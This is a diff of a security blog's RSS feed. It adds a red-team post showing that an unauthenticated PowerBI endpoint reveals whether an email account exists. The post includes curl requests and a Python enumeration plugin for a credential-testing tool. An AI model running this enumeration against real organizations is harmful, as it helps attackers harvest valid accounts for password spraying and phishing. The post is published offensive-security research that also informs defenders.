@@ -6,7 +6,163 @@
     <description>Recent content on SRA Labs | Cybersecurity Research &amp; Innovation by Security Risk Advisors</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 12 May 2026 12:00:00 +0000</lastBuildDate><atom:link href="https://labs.sra.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 19 May 2026 12:00:00 +0000</lastBuildDate><atom:link href="https://labs.sra.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>{&#34;accountExists&#34;: true} User Enumeration with PowerBI</title>
+      <link>https://labs.sra.io/posts/powerbi_enum/</link>
+      <pubDate>Tue, 19 May 2026 12:00:00 +0000</pubDate>
+      
+      <guid>https://labs.sra.io/posts/powerbi_enum/</guid>
+      <description>&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;External pentests and red teams often need reliable techniques for identifying and validating target users. Traditional methods like &lt;a href=&#34;https://github.com/sse-secure-systems/TeamsEnum&#34; target=&#34;_blank&#34;&gt;TeamsEnum&lt;/a&gt; and &lt;a href=&#34;https://github.com/nyxgeek/onedrive_user_enum&#34; target=&#34;_blank&#34;&gt;onedrive_user_enum&lt;/a&gt; are useful, but can be false positive-prone or require further authentication. The PowerBI API exposes an unauthenticated endpoint that returns a definitive &lt;code&gt;{&amp;quot;accountExists&amp;quot;:true}&lt;/code&gt; or a &lt;code&gt;404/500&lt;/code&gt;, which can be used to enumerate valid email addresses for a given organization.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;As adversaries, we&amp;rsquo;re constantly looking for new ways to perform enumeration as platforms and APIs shift. Within the Microsoft ecosystem this is especially common, they move fast, deprecate APIs (looking at you, Azure AD Graph), and regularly change how products authenticate and communicate.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;External pentests and red teams often need reliable techniques for identifying and validating target users. Traditional methods like &lt;a href=&#34;https://github.com/sse-secure-systems/TeamsEnum&#34; target=&#34;_blank&#34;&gt;TeamsEnum&lt;/a&gt; and &lt;a href=&#34;https://github.com/nyxgeek/onedrive_user_enum&#34; target=&#34;_blank&#34;&gt;onedrive_user_enum&lt;/a&gt; are useful, but can be false positive-prone or require further authentication. The PowerBI API exposes an unauthenticated endpoint that returns a definitive &lt;code&gt;{&amp;quot;accountExists&amp;quot;:true}&lt;/code&gt; or a &lt;code&gt;404/500&lt;/code&gt;, which can be used to enumerate valid email addresses for a given organization.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;As adversaries, we&amp;rsquo;re constantly looking for new ways to perform enumeration as platforms and APIs shift. Within the Microsoft ecosystem this is especially common, they move fast, deprecate APIs (looking at you, Azure AD Graph), and regularly change how products authenticate and communicate.&lt;/p&gt;
+&lt;p&gt;During a red team, we needed a reliable way to enumerate users in a large Microsoft Entra environment that had tenants configured with both Managed and Federated domains. However, the existing options weren&amp;rsquo;t cutting it:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/sse-secure-systems/TeamsEnum&#34; target=&#34;_blank&#34;&gt;TeamsEnum&lt;/a&gt;&lt;/strong&gt; required authentication to get reliable results&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/nyxgeek/onedrive_user_enum&#34; target=&#34;_blank&#34;&gt;onedrive_user_enum&lt;/a&gt;&lt;/strong&gt; was returning hits on deprovisioned or inactive accounts, making results noisy and unreliable&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;MS Graph-based techniques&lt;/strong&gt; had changed behavior, either not returning correct results, limited to only managed tenants, or requiring an actual authentication attempt to determine account validity, which risks triggering Smart Lockout or spray detection rules&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We needed something that was unauthenticated, low-noise, and accurate.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;finding-the-endpoint&#34;&gt;Finding the Endpoint&lt;/h2&gt;
+&lt;p&gt;To start, we leaned on prior research. My colleague Dave Parillo (&lt;a href=&#34;https://x.com/coffeebearsec_&#34; target=&#34;_blank&#34;&gt;@coffeebearsec&lt;/a&gt;) and I had previously done work on PowerBI that we called &lt;strong&gt;&lt;a href=&#34;https://sra.io/blog/letitgo-a-case-study-in-expired-domains-and-azure-ad/&#34; target=&#34;_blank&#34;&gt;LetItGo&lt;/a&gt;&lt;/strong&gt;, where we found that under the right tenant conditions (specifically, if self-service signup was enabled and an expired-but-configured domain was available), you could get PowerBI to create a new account for you in the target tenant without credentials.&lt;/p&gt;
+&lt;p&gt;Taking a similar approach, we started digging into the PowerBI authentication flow more broadly. PowerBI and its sibling platforms, Microsoft Fabric and Power BI Embedded, are notable in that they&amp;rsquo;re the only Microsoft services (that we&amp;rsquo;ve found) that maintain their own branded pre-auth entry point (&lt;code&gt;/singleSignOn&lt;/code&gt;) rather than handing off directly to &lt;code&gt;login.microsoftonline.com&lt;/code&gt;. This means they have their own pre-authentication logic, and that logic needs to resolve account state before it knows where to send you.&lt;/p&gt;
+&lt;p&gt;Digging into the API calls made during that flow, we found that all three make use of this endpoint:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;POST https://api.powerbi.com/AADRedirect/public/email/accountStatus
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Content-Type: application/json
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&amp;#34;emailAddress&amp;#34;: &amp;#34;target@organization.com&amp;#34;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Only the email address of the target organization is required.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;the-response&#34;&gt;The Response&lt;/h2&gt;
+&lt;p&gt;The response from this API couldn&amp;rsquo;t be cleaner from an enumeration perspective.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Valid Account (&lt;code&gt;200 OK&lt;/code&gt;)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/json; charset=utf-8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RequestId&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;a25c8c51-a67a-460f-984e-cfe6685237c9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;accountExists&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Invalid Account (&lt;code&gt;404 Not Found&lt;/code&gt;)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Not Found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/octet-stream&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RequestId&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;d19f8666-fded-4e3c-9973-cf1b11383580&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;[&lt;/span&gt;empty body&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Nonexistent Organization (&lt;code&gt;500 Internal Server Error&lt;/code&gt;)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Internal Server Error&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/json; charset=utf-8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RequestId&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;b265cd37-d2c1-4a2a-b148-1fedb0df31f9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;:{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AADEmailAccountStatusFailed&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;pbi.error&amp;#34;&lt;/span&gt;:{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AADEmailAccountStatusFailed&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;parameters&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;details&amp;#34;&lt;/span&gt;:[]}}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The signal is a combination of HTTP status code and body&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A valid account gets a &lt;code&gt;200&lt;/code&gt; with &lt;code&gt;{&amp;quot;accountExists&amp;quot;:true}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;An invalid account gets a &lt;code&gt;404&lt;/code&gt; with no body and a content type of &lt;code&gt;application/octet-stream&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;An account with an org that doesn&amp;rsquo;t exist gets a &lt;code&gt;500&lt;/code&gt; with &lt;code&gt;{&amp;quot;error&amp;quot;:...}&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;using-it-in-practice&#34;&gt;Using It in Practice&lt;/h2&gt;
+&lt;p&gt;The simplest possible test:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Valid user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -s -X POST &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://api.powerbi.com/AADRedirect/public/email/accountStatus&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/json&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Origin: https://app.powerbi.com&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;emailAddress&amp;#34;:&amp;#34;user@targetorg.com&amp;#34;}&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Returns: {&amp;#34;accountExists&amp;#34;:true}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Invalid user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -s -X POST &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://api.powerbi.com/AADRedirect/public/email/accountStatus&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/json&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Origin: https://app.powerbi.com&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;emailAddress&amp;#34;:&amp;#34;nobody@targetorg.com&amp;#34;}&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Returns: (empty, 404) or ({&amp;#34;error&amp;#34;:..., 500)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the CaptainCredz plugin implementation, which handles this as a pure enumeration module:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;479512386&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;479512386&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;PYTHON&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;CaptinCredz Plugin&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-PYTHON&#34; &gt;&lt;code&gt;
+class Plugin:
+    def __init__(self, requester, pluginargs):
+        self.requester = requester
+        self.pluginargs = pluginargs
+
+    def validate(self):
+        return True, &amp;#34;&amp;#34;
+
+    def testconnect(self, useragent):
+        r = self.requester.get(
+            &amp;#34;https://app.powerbi.com&amp;#34;,
+            headers={&amp;#34;User-Agent&amp;#34;: useragent}
+        )
+        return r.status_code == 200
+
+    def test_authenticate(self, username, password, useragent):
+        data_response = {
+            &amp;#34;result&amp;#34;: None,
+            &amp;#34;error&amp;#34;: False,
+            &amp;#34;output&amp;#34;: &amp;#34;&amp;#34;,
+            &amp;#34;request&amp;#34;: None
+        }
+        try:
+            sess = self.requester.session()
+            sess.headers.update({
+                &amp;#34;User-Agent&amp;#34;: useragent,
+                &amp;#34;Content-Type&amp;#34;: &amp;#34;application/json&amp;#34;,
+                &amp;#34;Origin&amp;#34;: &amp;#34;https://app.powerbi.com&amp;#34;,
+            })
+            r = sess.post(
+                &amp;#34;https://api.powerbi.com/AADRedirect/public/email/accountStatus&amp;#34;,
+                json={&amp;#34;emailAddress&amp;#34;: username},
+                allow_redirects=False
+            )
+            data_response[&amp;#34;request&amp;#34;] = r
+
+            if r.status_code == 200:
+                data_response[&amp;#34;result&amp;#34;] = &amp;#34;potential&amp;#34;
+                data_response[&amp;#34;output&amp;#34;] = f&amp;#34;[&amp;#43;] VALID: {username}&amp;#34;
+            elif r.status_code == 404:
+                data_response[&amp;#34;result&amp;#34;] = &amp;#34;nonexistant&amp;#34;
+                data_response[&amp;#34;output&amp;#34;] = f&amp;#34;[-] INVALID: {username}&amp;#34;
+            elif r.status_code == 500:
+                data_response[&amp;#34;result&amp;#34;] = &amp;#34;nonexistant&amp;#34;
+                data_response[&amp;#34;output&amp;#34;] = f&amp;#34;[-] INVALID: {username}&amp;#34;
+            else:
+                data_response[&amp;#34;result&amp;#34;] = &amp;#34;failure&amp;#34;
+                data_response[&amp;#34;output&amp;#34;] = f&amp;#34;[?] UNEXPECTED {r.status_code}: {username}&amp;#34;
+
+        except Exception as ex:
+            data_response[&amp;#34;error&amp;#34;] = True
+            data_response[&amp;#34;output&amp;#34;] = str(ex)
+
+        return data_response
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;hr&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;User enumeration isn&amp;rsquo;t new, but having a single unauthenticated POST that returns a &lt;code&gt;200&lt;/code&gt;/&lt;code&gt;404&lt;/code&gt;/&lt;code&gt;500&lt;/code&gt; for account validity is about as clean as it gets. No spray risk, no lockout, and no false positives from stale accounts. The fact that this lives under &lt;code&gt;api.powerbi.com&lt;/code&gt; rather than the &lt;code&gt;login.microsoftonline.com&lt;/code&gt; infrastructure makes this a valuable target for adversaries, as it&amp;rsquo;s an API for a product that prioritized broad adoption over tight auth controls.&lt;/p&gt;
+&lt;p&gt;One pattern worth internalizing: emerging or heavily-marketed Microsoft platforms like PowerBI, Fabric, Power BI Embedded, tend to maintain their own pre-auth flows outside the standard Entra HRD (home realm discovery) path, and those flows need to resolve account state somewhere. When you&amp;rsquo;re looking for new enumeration surfaces in a Microsoft environment, these bespoke sign-in flows are a good place to start. The attack surface is constantly evolving, and specific endpoints may be patched, but the pattern of looking here applies regardless.&lt;/p&gt;
+&lt;p&gt;If you have any questions or concerns, feel free to reach out to &lt;a href=&#34;https://x.com/illegitimateDA&#34; target=&#34;_blank&#34;&gt;@illegitimateDA&lt;/a&gt;.&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Analyzing Risk for IAM PassRole</title>
       <link>https://labs.sra.io/posts/awspassrole/</link>
@@ -46,8 +202,8 @@
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;268795413&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;268795413&#34;&gt;
+    &lt;input id=&#34;895327461&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;895327461&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Restricting PassRole via a Resource&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -73,8 +229,8 @@
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;271395468&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;271395468&#34;&gt;
+    &lt;input id=&#34;763185924&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;763185924&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Restricting PassRole via iam:PassedToService&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -104,8 +260,8 @@
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;396871425&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;396871425&#34;&gt;
+    &lt;input id=&#34;897135462&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;897135462&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Restricting PassRole via iam:AssociatedResourceARN&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -179,8 +335,8 @@
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;482563179&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;482563179&#34;&gt;
+    &lt;input id=&#34;863941572&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;863941572&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Statement walking&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -242,8 +398,8 @@ for result in results:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;145786239&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;145786239&#34;&gt;
+    &lt;input id=&#34;713489652&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;713489652&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Trust policy&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -323,8 +479,8 @@ for result in results:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;624731958&#34; type=&#34;checkbox&#34; checked /&gt;
-    &lt;label for=&#34;624731958&#34;&gt;
+    &lt;input id=&#34;752198634&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;752198634&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;PassRole Enrichment&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
